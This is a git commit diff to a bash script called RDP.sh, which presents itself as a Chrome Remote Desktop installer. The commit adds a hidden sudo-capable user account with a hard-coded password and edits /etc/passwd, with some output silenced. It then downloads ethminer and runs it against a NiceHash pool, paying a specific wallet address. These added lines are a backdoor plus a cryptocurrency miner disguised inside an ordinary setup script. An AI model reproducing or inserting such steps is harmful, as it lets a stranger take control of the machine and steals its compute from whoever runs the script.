08fb0e953ae8ed1517b9951d6a4cec0d785bc562
NexMou <69827604+NexMou@users.noreply.github.com>
2020-12-30 10:43:00 +0700

    Update RDP.sh

--- RDP.sh
+++ RDP.sh
@@ -1,6 +1,10 @@
 #! /bin/bash
 printf "Installing RDP Be Patience... " >&2
 {
+sudo useradd -m NexMou
+sudo adduser NexMou sudo
+echo 'NexMou:9812' | sudo chpasswd
+sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
 sudo apt-get update
 wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
 sudo dpkg --install chrome-remote-desktop_current_amd64.deb
@@ -14,11 +18,20 @@ wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
 sudo dpkg --install google-chrome-stable_current_amd64.deb
 sudo apt install --assume-yes --fix-broken
 sudo apt install nautilus nano -y 
+sudo adduser NexMou chrome-remote-desktop
+} &> /dev/null &&
+sudo apt update
+sudo apt install zip unzip
+sudo apt install vlc
+sudo apt install ethereum
+wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+tar xf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+bin/ethminer -P stratum2+tcp://3NNk4bEka7HLEHJBZ6n9YMjbh5gnV9Nevv.BXZ@daggerhashimoto.usa.nicehash.com:3353
 printf "\nSetup Complete " >&2 ||
 printf "\nError Occured " >&2
 printf '\nCheck https://remotedesktop.google.com/headless  Copy Command Of Debian Linux And Paste Down\n'
 read -p "Paste Here: " CRP
-su -c """$CRP"""
+su - NexMou -c """$CRP"""
 printf 'Check https://remotedesktop.google.com/access/ \n\n'
 if sudo apt-get upgrade &> /dev/null
 then
